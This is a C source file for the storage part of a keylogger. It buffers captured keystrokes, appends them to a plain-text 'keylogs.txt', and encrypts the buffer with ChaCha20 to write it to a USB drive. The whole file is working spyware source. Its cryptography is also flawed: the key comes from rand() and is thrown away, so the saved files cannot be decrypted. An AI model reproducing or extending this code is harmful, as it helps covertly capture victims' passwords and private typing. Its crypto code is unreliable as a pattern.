#include "key_logger_storage.h"
#include "encryption.h"
#include "utils.h"
#include <string.h>
#include <stdio.h>
#include <time.h>

#define MAX_BUFFER_SIZE 4096
#define FLUSH_INTERVAL 60

struct KeyLoggerStorage {
    char buffer[MAX_BUFFER_SIZE];
    size_t buffer_pos;
    time_t last_flush_time;
};

KeyLoggerStorage* key_logger_storage_create(void) {
    KeyLoggerStorage* storage = safe_malloc(sizeof(KeyLoggerStorage));
    if (storage) {
        memset(storage->buffer, 0, MAX_BUFFER_SIZE);
        storage->buffer_pos = 0;
        storage->last_flush_time = time(NULL);
    }
    return storage;
}

void key_logger_storage_destroy(KeyLoggerStorage* storage) {
    if (storage) {
        memset(storage->buffer, 0, MAX_BUFFER_SIZE);
        safe_free(storage);
    }
}

bool key_logger_storage_add_key(KeyLoggerStorage* storage, const char* key) {
    if (!storage || !key) return false;

    size_t key_len = strlen(key);
    if (storage->buffer_pos + key_len >= MAX_BUFFER_SIZE) {
        if (!key_logger_storage_flush_to_file(storage, "keylogs.txt")) {
            return false;
        }
    }

    strncpy(storage->buffer + storage->buffer_pos, key, MAX_BUFFER_SIZE - storage->buffer_pos);
    storage->buffer_pos += key_len;

    time_t current_time = time(NULL);
    if (current_time - storage->last_flush_time >= FLUSH_INTERVAL) {
        if (!key_logger_storage_flush_to_file(storage, "keylogs.txt")) {
            return false;
        }
        storage->last_flush_time = current_time;
    }

    return true;
}

bool key_logger_storage_flush_to_file(KeyLoggerStorage* storage, const char* filepath) {
    if (!storage || !filepath) return false;

    FILE* file = fopen(filepath, "a");
    if (!file) return false;

    size_t written = fwrite(storage->buffer, 1, storage->buffer_pos, file);
    fclose(file);

    if (written == storage->buffer_pos) {
        memset(storage->buffer, 0, MAX_BUFFER_SIZE);
        storage->buffer_pos = 0;
        return true;
    }

    return false;
}

bool key_logger_storage_encrypt_and_save_to_usb(KeyLoggerStorage* storage, const char* usb_path) {
    if (!storage || !usb_path) return false;

    uint8_t key[CHACHA20_KEY_SIZE];
    uint8_t nonce[CHACHA20_NONCE_SIZE];
    generate_random_bytes(key, CHACHA20_KEY_SIZE);
    generate_random_bytes(nonce, CHACHA20_NONCE_SIZE);

    ChaCha20_ctx ctx;
    chacha20_init(&ctx, key, nonce);
    uint8_t* encrypted_buffer = safe_malloc(storage->buffer_pos);
    if (!encrypted_buffer) return false;

    chacha20_encrypt(&ctx, (uint8_t*)storage->buffer, encrypted_buffer, storage->buffer_pos);

    char filepath[256];
    snprintf(filepath, sizeof(filepath), "%s/encrypted_keylogs_%lu.bin", usb_path, (unsigned long)time(NULL));

    FILE* file = fopen(filepath, "wb");
    if (!file) {
        safe_free(encrypted_buffer);
        return false;
    }

    fwrite(nonce, 1, CHACHA20_NONCE_SIZE, file);
    fwrite(encrypted_buffer, 1, storage->buffer_pos, file);

    fclose(file);
    safe_free(encrypted_buffer);

    return true;
}

static void generate_random_bytes(uint8_t* buffer, size_t length) {
    // TEST USAGE
    for (size_t i = 0; i < length; ++i) {
        buffer[i] = rand() & 0xFF;
    }
}